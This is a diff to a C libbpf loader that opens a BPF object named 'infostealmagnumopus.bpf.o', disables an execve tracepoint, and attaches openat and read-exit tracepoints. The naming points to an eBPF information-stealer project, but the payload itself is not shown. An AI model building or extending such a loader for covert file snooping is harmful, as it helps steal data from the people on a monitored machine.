@@ -23,7 +23,7 @@ int main()
     signal(SIGTERM, sig_handler);
 
     // Open the compiled BPF object
-    obj = bpf_object__open_file("hbashmagnumopus.bpf.o", NULL);
+    obj = bpf_object__open_file("infostealmagnumopus.bpf.o", NULL);
     if (libbpf_get_error(obj)) {
         fprintf(stderr, "Failed to open BPF object: %ld\n", libbpf_get_error(obj));
         return 1;
@@ -40,19 +40,19 @@ int main()
     // Find and attach the raw tracepoint program
 
     // trace_execve
-    trace_execve_prog = bpf_object__find_program_by_name(obj, "trace_execve");
-    if (!trace_execve_prog) {
-        fprintf(stderr, "Failed to find program trace_execve\n");
-        bpf_object__close(obj);
-        return 1;
-    }
-    trace_execve_link = bpf_program__attach(trace_execve_prog);
-    if (libbpf_get_error(trace_execve_link)) {
-        fprintf(stderr, "Failed to attach program: %ld\n", libbpf_get_error(trace_execve_link));
-        trace_execve_link = NULL;
-    } else {
-        printf("Successfully attached raw tracepoint: raw_tracepoint/sys_enter trace_execve\n");
-    }
+    // trace_execve_prog = bpf_object__find_program_by_name(obj, "trace_execve");
+    // if (!trace_execve_prog) {
+    //     fprintf(stderr, "Failed to find program trace_execve\n");
+    //     bpf_object__close(obj);
+    //     return 1;
+    // }
+    // trace_execve_link = bpf_program__attach(trace_execve_prog);
+    // if (libbpf_get_error(trace_execve_link)) {
+    //     fprintf(stderr, "Failed to attach program: %ld\n", libbpf_get_error(trace_execve_link));
+    //     trace_execve_link = NULL;
+    // } else {
+    //     printf("Successfully attached raw tracepoint: raw_tracepoint/sys_enter trace_execve\n");
+    // }
 
 
 
@@ -71,21 +71,6 @@ int main()
     } else {
         printf("Successfully attached raw tracepoint: raw_tracepoint/sys_enter tp_openat_enter\n");
     }
-
-    // kp__x64_sys_read_prog = bpf_object__find_program_by_name(obj, "kp__x64_sys_read");
-    // if (!kp__x64_sys_read_prog) {
-    //     fprintf(stderr, "Failed to find program kp__x64_sys_read\n");
-    //     bpf_object__close(obj);
-    //     return 1;
-    // }
-    // kp__x64_sys_read_link = bpf_program__attach(kp__x64_sys_read_prog);
-    // if (libbpf_get_error(kp__x64_sys_read_link)) {
-    //     fprintf(stderr, "Failed to attach program: %ld\n", libbpf_get_error(kp__x64_sys_read_link));
-    //     kp__x64_sys_read_link = NULL;
-    // } else {
-    //     printf("Successfully attached raw tracepoint: raw_tracepoint/sys_enter kp__x64_sys_read\n");
-    // }
-
 
     // 
     tp_read_exit_prog = bpf_object__find_program_by_name(obj, "tp_read_exit");
@@ -113,9 +98,6 @@ int main()
         sleep(1);
 
     // Clean up
-    if (trace_execve_link)
-        bpf_link__destroy(trace_execve_link);
-    // bpf_object__close(obj);
 
     if (tp_openat_enter_link)
         bpf_link__destroy(tp_openat_enter_link);
@@ -123,9 +105,6 @@ int main()
 
     if (tp_read_exit_link)
         bpf_link__destroy(tp_read_exit_link);
-
-    // if(kp__x64_sys_read_link)
-    //     bpf_link__destroy(kp__x64_sys_read_link);
 
     bpf_object__close(obj);
 
